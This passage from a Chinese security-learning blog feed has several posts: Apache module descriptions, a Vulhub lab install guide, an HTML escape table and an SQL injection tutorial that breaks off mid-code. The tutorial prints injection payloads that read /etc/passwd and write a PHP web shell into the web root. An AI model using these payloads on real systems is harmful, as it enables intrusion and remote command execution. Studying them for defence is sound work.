href="http://httpd.apache.org/docs/2.4/mod/mod_log_forensic.html">mod_log_forensic</a></p><p>对服务器发出的请求进行取证记录</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_logio.html">mod_logio</a></p><p>记录每个请求的输入和输出字节</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lua.html">mod_lua</a></p><p>将 Lua 挂钩提供到 httpd 请求处理的各个部分</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_macro.html">mod_macro</a></p><p>在 apache httpd 运行时配置文件中提供宏</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_md.html">mod_md</a></p><p>跨虚拟主机管理域，通过 ACME 协议提供证书</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a></p><p>将请求的文件名的扩展名与文件的行为（处理程序和过滤器）和内容（mime 类型、语言、字符集和编码）相关联 </p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_mime_magic.html">mod_mime_magic</a></p><p>通过查看文件内容的几个字节来确定文件的 MIME 类型</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_negotiation.html">mod_negotiation</a></p><p>提供<a href="http://httpd.apache.org/docs/2.4/content-negotiation.html">内容协商</a></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_nw_ssl.html">mod_nw_ssl</a></p><p>为 NetWare 启用 SSL 加密</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_privileges.html">mod_privileges</a></p><p>支持 Solaris 特权和在不同用户 ID 下运行虚拟主机</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy.html">mod_proxy</a></p><p>多协议代理/网关服务器</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_ajp.html">mod_proxy_ajp</a></p><p>mod_proxy 的 AJP 支持模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_balancer.html">mod_proxy_balancer</a></p><p><code>mod_proxy</code>负载平衡的扩展</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_connect.html">mod_proxy_connect</a></p><p>用于请求处理的 mod_proxy 扩展CONNECT</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_express.html">mod_proxy_express</a></p><p>mod_proxy 的动态大规模反向代理扩展</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_fcgi.html">mod_proxy_fcgi</a></p><p>用于 mod_proxy 的 FastCGI 支持模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_fdpass.html">mod_proxy_fdpass</a></p><p>用于 mod_proxy 的 fdpass 外部进程支持模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_ftp.html">mod_proxy_ftp</a></p><p>mod_proxy 的 FTP 支持模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_hcheck.html">mod_proxy_hcheck</a></p><p>对 mod_proxy 的 Balancer 成员（工作人员）进行动态健康检查</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_html.html">mod_proxy_html</a></p><p>重写 HTML 链接以确保它们可以从代理上下文中的客户端网络寻址</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_http.html">mod_proxy_http</a></p><p>mod_proxy 的 HTTP 支持模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_http2.html">mod_proxy_http2</a></p><p>mod_proxy 的 HTTP/2 支持模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_scgi.html">mod_proxy_scgi</a></p><p>用于 mod_proxy 的 SCGI 网关模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_uwsgi.html">mod_proxy_uwsgi</a></p><p>用于 mod_proxy 的 UWSGI 网关模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_wstunnel.html">mod_proxy_wstunnel</a></p><p>用于 mod_proxy 的 Websockets 支持模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ratelimit.html">mod_ratelimit</a></p><p>客户端带宽速率限制</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_reflector.html">mod_reflector</a></p><p>通过输出过滤器堆栈将请求正文反映为响应</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_remoteip.html">mod_remoteip</a></p><p>将连接的原始客户端 IP 地址替换为代理或负载均衡器通过请求标头提供的用户代理 IP 地址列表</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_reqtimeout.html">mod_reqtimeout</a></p><p>设置接收请求的超时和最小数据速率</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_request.html">mod_request</a></p><p>用于处理和提供可用 HTTP 请求正文的过滤器</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_rewrite.html">mod_rewrite</a></p><p>提供基于规则的重写引擎来即时重写请求的 URL</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_sed.html">mod_sed</a></p><p>使用语法过滤输入（请求）和输出（响应）内容</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session.html">mod_session</a></p><p>会话支持</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session_cookie.html">mod_session_cookie</a></p><p>基于 Cookie 的会话支持</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session_crypto.html">mod_session_crypto</a></p><p>会话加密支持</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session_dbd.html">mod_session_dbd</a></p><p>基于 DBD/SQL 的会话支持</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_setenvif.html">mod_setenvif</a></p><p>允许根据请求的特征设置环境变量</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_slotmem_plain.html">mod_slotmem_plain</a></p><p>基于插槽的共享内存提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_slotmem_shm.html">mod_slotmem_shm</a></p><p>基于插槽的共享内存提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_so.html">mod_so</a></p><p>在启动或重新启动时将可执行代码和模块加载到服务器中</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_dbm.html">mod_socache_dbm</a></p><p>基于 DBM 的共享对象缓存提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_dc.html">mod_socache_dc</a></p><p>基于 Distcache 的共享对象缓存提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_memcache.html">mod_socache_memcache</a></p><p>基于 Memcache 的共享对象缓存提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_redis.html">mod_socache_redis</a></p><p>基于 Redis 的共享对象缓存提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_shmcb.html">mod_socache_shmcb</a></p><p>基于 shmcb 的共享对象缓存提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_speling.html">mod_speling</a></p><p>尝试通过忽略大小写或尝试更正各种小拼写错误来更正错误的 URL</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ssl.html">mod_ssl</a></p><p>使用安全套接字层 (SSL) 和传输层安全 (TLS) 协议的强密码术</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_status.html">mod_status</a></p><p>提供有关服务器活动和性能的信息</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_substitute.html">mod_substitute</a></p><p>对响应体执行搜索和替换操作</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_suexec.html">mod_suexec</a></p><p>允许 CGI 脚本作为指定的用户和组运行</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_systemd.html">mod_systemd</a></p><p>为系统集成提供更好的支持</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_unique_id.html">mod_unique_id</a></p><p>为每个请求提供一个具有唯一标识符的环境变量</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_unixd.html">mod_unixd</a></p><p>Unix 系列平台的基本（必需）安全性</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html">mod_userdir</a></p><p>特定于用户的目录</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_usertrack.html">mod_usertrack</a></p><p>站点上用户活动的点击流日志记录</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_version.html">mod_version</a></p><p>版本相关配置</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_vhost_alias.html">mod_vhost_alias</a></p><p>提供动态配置的海量虚拟主机</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_watchdog.html">mod_watchdog</a></p><p>为其他模块提供基础设施以定期运行任务</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_xml2enc.html">mod_xml2enc</a></p><p>增强了对基于 libxml2 的过滤器模块的字符集/国际化支持</p><p>[^更多请参考]: <a href="http://httpd.apache.org/docs/2.4/zh-cn/">Apache HTTP 服务器 2.4 文档 - Apache HTTP 服务器 版本 2.4</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub安装</title>
      <link href="/2021/07/21/vulhub-an-zhuang/"/>
      <url>/2021/07/21/vulhub-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulhub安装"><a href="#Vulhub安装" class="headerlink" title="Vulhub安装"></a>Vulhub安装</h1><p>操作系统：ubuntu20</p><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> https://get.docker.com/ <span class="token operator">|</span> <span class="token function">sh</span> or<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> docker.io<span class="token function">docker</span> version<span class="token comment">#返回则成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#先安装pip</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> https://bootstrap.pypa.io/get-pip.py <span class="token operator">|</span> python3pip <span class="token function">install</span> <span class="token function">docker-compose</span><span class="token function">docker-compose</span> <span class="token parameter variable">-v</span><span class="token comment">#有返回说明成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Vulhub安装-1"><a href="#Vulhub安装-1" class="headerlink" title="Vulhub安装"></a>Vulhub安装</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#自己创建一个目录或者直接在主目录下执行，会自行创建一个文件夹</span><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#进入想要实验的环境</span><span class="token builtin class-name">cd</span> flask/ssti<span class="token function">docker-compose</span> build<span class="token comment">#更新配置后重新编译靶场环境</span><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token comment">#推荐后者</span><span class="token function">docker</span> <span class="token function">ps</span><span class="token comment">#查看运行端口</span><span class="token comment">#物理机中访问：ip:port</span><span class="token function">docker-compose</span> down<span class="token comment">#结束运行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML转义字符</title>
      <link href="/2021/07/20/html-zhuan-yi-zi-fu/"/>
      <url>/2021/07/20/html-zhuan-yi-zi-fu/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML转义字符"><a href="#HTML转义字符" class="headerlink" title="HTML转义字符"></a>HTML转义字符</h1><h2 id="常用对照表"><a href="#常用对照表" class="headerlink" title="常用对照表"></a>常用对照表</h2><table><thead><tr><th>字符</th><th>十进制</th><th>转义字符</th></tr></thead><tbody><tr><td>“</td><td><code>&amp;#34</code></td><td><code>&amp;quot</code></td></tr><tr><td>&amp;</td><td><code>&amp;#38 </code></td><td><code>&amp;amp</code></td></tr><tr><td>&lt;</td><td><code>&amp;#60</code></td><td><code>&amp;lt</code></td></tr><tr><td>&gt;</td><td><code>&amp;#62</code></td><td><code>&amp;gt </code></td></tr><tr><td>不断开空格(non-breaking space)</td><td><code>&amp;#160</code></td><td><code>&amp;nbsp </code></td></tr></tbody></table><h2 id="HTML特殊转义字符对照表"><a href="#HTML特殊转义字符对照表" class="headerlink" title="HTML特殊转义字符对照表"></a>HTML特殊转义字符对照表</h2><table><thead><tr><th align="left">字符</th><th align="left">十进制</th><th align="left">转义字符</th><th align="left">字符</th><th align="left">十进制</th><th align="left">转义字符</th><th align="left">字符</th><th align="left">十进制</th><th align="left">转义字符</th></tr></thead><tbody><tr><td align="left">?</td><td align="left"><code>&amp;#161</code></td><td align="left"><code>&amp;iexcl </code></td><td align="left">Á</td><td align="left"><code>&amp;#193</code></td><td align="left"><code>&amp;Aacute </code></td><td align="left">á</td><td align="left"><code>&amp;#225 </code></td><td align="left"><code>&amp;aacute </code></td></tr><tr><td align="left">￠</td><td align="left"><code>&amp;#162</code></td><td align="left"><code>&amp;cent </code></td><td align="left">Â</td><td align="left"><code>&amp;#194 </code></td><td align="left"><code>&amp;circ </code></td><td align="left">â</td><td align="left"><code>&amp;#226</code></td><td align="left"><code>&amp;acirc </code></td></tr><tr><td align="left">￡</td><td align="left"><code>&amp;#163 </code></td><td align="left"><code>&amp;pound </code></td><td align="left">Ã</td><td align="left"><code>&amp;#195 </code></td><td align="left"><code>&amp;Atilde </code></td><td align="left">ã</td><td align="left"><code>&amp;#227 </code></td><td align="left"><code>&amp;atilde </code></td></tr><tr><td align="left">¤</td><td align="left"><code>&amp;#164 </code></td><td align="left"><code>&amp;curren</code></td><td align="left">Ä</td><td align="left"><code>&amp;#196</code></td><td align="left"><code>&amp;Auml</code></td><td align="left">ä</td><td align="left"><code>&amp;#228</code></td><td align="left"><code>&amp;auml </code></td></tr><tr><td align="left">￥</td><td align="left"><code>&amp;#165 </code></td><td align="left"><code>&amp;yen </code></td><td align="left">Å</td><td align="left"><code>&amp;#197 </code></td><td align="left"><code>&amp;ring </code></td><td align="left">å</td><td align="left"><code>&amp;#229</code></td><td align="left"><code>&amp;aring </code></td></tr><tr><td align="left">|</td><td align="left"><code>&amp;#166</code></td><td align="left"><code>&amp;brvbar </code></td><td align="left">Æ</td><td align="left"><code>&amp;#198 </code></td><td align="left"><code>&amp;AElig </code></td><td align="left">æ</td><td align="left"><code>&amp;#230 </code></td><td align="left"><code>&amp;aelig </code></td></tr><tr><td align="left">§</td><td align="left"><code>&amp;#167</code></td><td align="left"><code>&amp;sect </code></td><td align="left">Ç</td><td align="left"><code>&amp;#199 </code></td><td align="left"><code>&amp;Ccedil </code></td><td align="left">ç</td><td align="left"><code>&amp;#231</code></td><td align="left"><code>&amp;ccedil </code></td></tr><tr><td align="left">¨</td><td align="left"><code>&amp;#168 </code></td><td align="left"><code>&amp;uml </code></td><td align="left">È</td><td align="left"><code>&amp;#200 </code></td><td align="left"><code>&amp;Egrave </code></td><td align="left">è</td><td align="left"><code>&amp;#232 </code></td><td align="left"><code>&amp;egrave</code></td></tr><tr><td align="left">©</td><td align="left"><code>&amp;#169</code></td><td align="left"><code>&amp;copy </code></td><td align="left">É</td><td align="left"><code>&amp;#201 </code></td><td align="left"><code>&amp;Eacute </code></td><td align="left">é</td><td align="left"><code>&amp;#233 </code></td><td align="left"><code>&amp;eacute </code></td></tr><tr><td align="left">a</td><td align="left"><code>&amp;#170 </code></td><td align="left"><code>&amp;ordf </code></td><td align="left">Ê</td><td align="left"><code>&amp;#202 </code></td><td align="left"><code>&amp;Ecirc </code></td><td align="left">ê</td><td align="left"><code>&amp;#234 </code></td><td align="left"><code>&amp;ecirc </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#171</code></td><td align="left"><code>&amp;laquo </code></td><td align="left">Ë</td><td align="left"><code>&amp;#203 </code></td><td align="left"><code>&amp;Euml </code></td><td align="left">ë</td><td align="left"><code>&amp;#235 </code></td><td align="left"><code>&amp;euml </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#172 </code></td><td align="left"><code>&amp;not </code></td><td align="left">Ì</td><td align="left"><code>&amp;#204 </code></td><td align="left"><code>&amp;Igrave </code></td><td align="left">ì</td><td align="left"><code>&amp;#236 </code></td><td align="left"><code>&amp;igrave </code></td></tr><tr><td align="left">/x7f</td><td align="left"><code>&amp;#173 </code></td><td align="left"><code>&amp;shy </code></td><td align="left">Í</td><td align="left"><code>&amp;#205 </code></td><td align="left"><code>&amp;Iacute </code></td><td align="left">í</td><td align="left"><code>&amp;#237 </code></td><td align="left"><code>&amp;iacute </code></td></tr><tr><td align="left">®</td><td align="left"><code>&amp;#174 </code></td><td align="left"><code>&amp;reg </code></td><td align="left">Î</td><td align="left"><code>&amp;#206 </code></td><td align="left"><code>&amp;Icirc </code></td><td align="left">î</td><td align="left"><code>&amp;#238 </code></td><td align="left"><code>&amp;icirc </code></td></tr><tr><td align="left">ˉ</td><td align="left"><code>&amp;#175 </code></td><td align="left"><code>&amp;macr </code></td><td align="left">Ï</td><td align="left"><code>&amp;#207 </code></td><td align="left"><code>&amp;Iuml </code></td><td align="left">ï</td><td align="left"><code>&amp;#239 </code></td><td align="left"><code>&amp;iuml </code></td></tr><tr><td align="left">°</td><td align="left"><code>&amp;#176 </code></td><td align="left"><code>&amp;deg </code></td><td align="left">Ð</td><td align="left"><code>&amp;#208 </code></td><td align="left"><code>&amp;ETH </code></td><td align="left">ð</td><td align="left"><code>&amp;#240 </code></td><td align="left"><code>&amp;ieth </code></td></tr><tr><td align="left">±</td><td align="left"><code>&amp;#177 </code></td><td align="left"><code>&amp;plusmn </code></td><td align="left">Ñ</td><td align="left"><code>&amp;#209</code></td><td align="left"><code>&amp;Ntilde </code></td><td align="left">ñ</td><td align="left"><code>&amp;#241 </code></td><td align="left"><code>&amp;ntilde </code></td></tr><tr><td align="left">2</td><td align="left"><code>&amp;#178 </code></td><td align="left"><code>&amp;sup2 </code></td><td align="left">Ò</td><td align="left"><code>&amp;#210</code></td><td align="left"><code>&amp;Ograve </code></td><td align="left">ò</td><td align="left"><code>&amp;#242 </code></td><td align="left"><code>&amp;ograve </code></td></tr><tr><td align="left">3</td><td align="left"><code>&amp;#179 </code></td><td align="left"><code>&amp;sup3 </code></td><td align="left">Ó</td><td align="left"><code>&amp;#211</code></td><td align="left"><code>&amp;Oacute </code></td><td align="left">ó</td><td align="left"><code>&amp;#243 </code></td><td align="left"><code>&amp;oacute</code></td></tr><tr><td align="left">′</td><td align="left"><code>&amp;#180 </code></td><td align="left"><code>&amp;acute </code></td><td align="left">Ô</td><td align="left"><code>&amp;#212</code></td><td align="left"><code>&amp;Ocirc </code></td><td align="left">ô</td><td align="left"><code>&amp;#244 </code></td><td align="left"><code>&amp;ocirc </code></td></tr><tr><td align="left">μ</td><td align="left"><code>&amp;#181 </code></td><td align="left"><code>&amp;micro </code></td><td align="left">Õ</td><td align="left"><code>&amp;#213</code></td><td align="left"><code>&amp;Otilde </code></td><td align="left">õ</td><td align="left"><code>&amp;#245 </code></td><td align="left"><code>&amp;otilde </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#182 </code></td><td align="left"><code>&amp;para </code></td><td align="left">Ö</td><td align="left"><code>&amp;#214</code></td><td align="left"><code>&amp;Ouml </code></td><td align="left">ö</td><td align="left"><code>&amp;#246 </code></td><td align="left"><code>&amp;ouml </code></td></tr><tr><td align="left">·</td><td align="left"><code>&amp;#183 </code></td><td align="left"><code>&amp;middot</code></td><td align="left">&amp;times</td><td align="left"><code>&amp;#215</code></td><td align="left"><code>&amp;times </code></td><td align="left">÷</td><td align="left"><code>&amp;#247 </code></td><td align="left"><code>&amp;divide </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#184 </code></td><td align="left"><code>&amp;cedil </code></td><td align="left">Ø</td><td align="left"><code>&amp;#216</code></td><td align="left"><code>&amp;Oslash </code></td><td align="left">ø</td><td align="left"><code>&amp;#248 </code></td><td align="left"><code>&amp;oslash </code></td></tr><tr><td align="left">1</td><td align="left"><code>&amp;#185 </code></td><td align="left"><code>&amp;sup1 </code></td><td align="left">Ù</td><td align="left"><code>&amp;#217</code></td><td align="left"><code>&amp;Ugrave </code></td><td align="left">ù</td><td align="left"><code>&amp;#249 </code></td><td align="left"><code>&amp;ugrave </code></td></tr><tr><td align="left">o</td><td align="left"><code>&amp;#186 </code></td><td align="left"><code>&amp;ordm </code></td><td align="left">Ú</td><td align="left"><code>&amp;#218</code></td><td align="left"><code>&amp;Uacute</code></td><td align="left">ú</td><td align="left"><code>&amp;#250 </code></td><td align="left"><code>&amp;uacute </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#187 </code></td><td align="left"><code>&amp;raquo </code></td><td align="left">Û</td><td align="left"><code>&amp;#219</code></td><td align="left"><code>&amp;Ucirc </code></td><td align="left">û</td><td align="left"><code>&amp;#251 </code></td><td align="left"><code>&amp;ucirc </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#188 </code></td><td align="left"><code>&amp;frac14 </code></td><td align="left">Ü</td><td align="left"><code>&amp;#220</code></td><td align="left"><code>&amp;Uuml </code></td><td align="left">ü</td><td align="left"><code>&amp;#252 </code></td><td align="left"><code>&amp;uuml </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#189 </code></td><td align="left"><code>&amp;frac12 </code></td><td align="left">Ý</td><td align="left"><code>&amp;#221</code></td><td align="left"><code>&amp;Yacute </code></td><td align="left">ý</td><td align="left"><code>&amp;#253 </code></td><td align="left"><code>&amp;yacute </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#190 </code></td><td align="left"><code>&amp;frac34 </code></td><td align="left">Þ</td><td align="left"><code>&amp;#222</code></td><td align="left"><code>&amp;THORN </code></td><td align="left">þ</td><td align="left"><code>&amp;#254 </code></td><td align="left"><code>&amp;thorn </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#191 </code></td><td align="left"><code>&amp;iquest </code></td><td align="left">ß</td><td align="left"><code>&amp;#223</code></td><td align="left"><code>&amp;szlig </code></td><td align="left">ÿ</td><td align="left"><code>&amp;#255 </code></td><td align="left"><code>&amp;yuml </code></td></tr><tr><td align="left">À</td><td align="left"><code>&amp;#192</code></td><td align="left"><code>&amp;Agrave </code></td><td align="left">à</td><td align="left"><code>&amp;#224</code></td><td align="left"><code>&amp;agrave </code></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习</title>
      <link href="/2021/07/19/sql/"/>
      <url>/2021/07/19/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="数据库与web交互"><a href="#数据库与web交互" class="headerlink" title="数据库与web交互"></a>数据库与web交互</h3><p>数据库驱动的Web应用通常包含三层：表示层、逻辑层和存储层</p><p><img src="https://images.dadream.eu.org/images/2024/07/bd917bb464f4ecc0a70931647924489c.png"></p><p>Web浏览器（表示层）向中间层（逻辑层）发送请求，后者依次调用由位于应用层 的应用服务器提供的API，应用层通过查询、更新数据库（存储层）来响应该请求。</p><p><img src="https://images.dadream.eu.org/images/2024/07/fb4fe488ca6064bb837f649984e43f12.png"></p><h3 id="SQL注入的产生过程"><a href="#SQL注入的产生过程" class="headerlink" title="SQL注入的产生过程"></a><strong>SQL</strong>注入的产生过程</h3><h4 id="构造动态字符串"><a href="#构造动态字符串" class="headerlink" title="构造动态字符串"></a>构造动态字符串</h4><p>简单来说就是将得到参数拼接到查询语句，然后执行，下列不当将会导致SQL注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">TABLE</span> <span class="token keyword">WHERE</span> FIELD <span class="token operator">=</span> <span class="token string">'input'</span>input 在不同语言运行的服务器上写法不同PHP$query <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field ='$_GET["</span>input<span class="token string">"]'"</span><span class="token punctuation">.</span>NETquery <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = ' "</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ' "</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>转义字符处理不当</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">SQL</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '$_GET["</span>input<span class="token string">"]'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SQL数据库将单引号字符<code>'</code>解析成代码与数据间的分界线，单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> field <span class="token operator">=</span> <span class="token string">''</span>报错You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>' at line <span class="token number">1</span>这是一种报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>出现该错误是因为单引号字符被解析成了字符串分隔符。运行时执行的SQL查询在语法上存在错误(它包含多个字符串分隔符)，所以数据库抛出异常。SQL数据库将单引号字符看作特殊字符(字符串分隔符)。</p><p>当然还有其他的转义字符，比如oracle中，空格<code> </code> 双斜线<code>|| </code>逗号<code>,</code> 点号<code>.</code> <code>*/</code>以及双引号<code>"</code> 这里不详细讲解。</p><p><code>||</code>将前后的执行结果连接</p><p><code>*/</code> 结束注释</p></li><li><p>类型处理不当</p><p>接受的参数类型不一定是字符串，也可能是数字型，这里一味地过滤单引号也就没多大用处。</p><p>数字型<code>or 1=1</code>大概判断，一旦存在并有FILE权限，就能使用下面代码注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token comment">--</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token string">"&lt;? system($_REQUEST['cmd']); ?&gt;"</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">"/var/www/html/victim.com/cmd.php"</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>查询语句组装不当</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$SQL</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"columnl"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">","</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"column2"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">","</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"column3"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">"FROM"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"table"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种随便改个包发送，数据库基本上就没了，因为所有参数可改</p></li><li><p>错误处理不当</p><p>就如第一个报错，报错信息完全不必展示给用户看，不展示，自然会阻断部分攻击者。</p></li><li><p>多个提交处理不当</p><p>这里有点条件竞争的意思</p><p>第一个提交需要验证码，第二个却没设置，正常用户可能会从第一个提交进入，攻击者就会用第二个提交FUZZ，这就和某些应用分享一样，不验证是否成功，虚晃一招。</p></li></ul><h4 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h4><p>默认的数据库系统管理员账号，预置的系统库，表，很多的默认配置都是不安全的，试想一下，知道你的管理员账号，爆破密码会降低多少数量级的难度</p><p>降低权限是一个好习惯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token 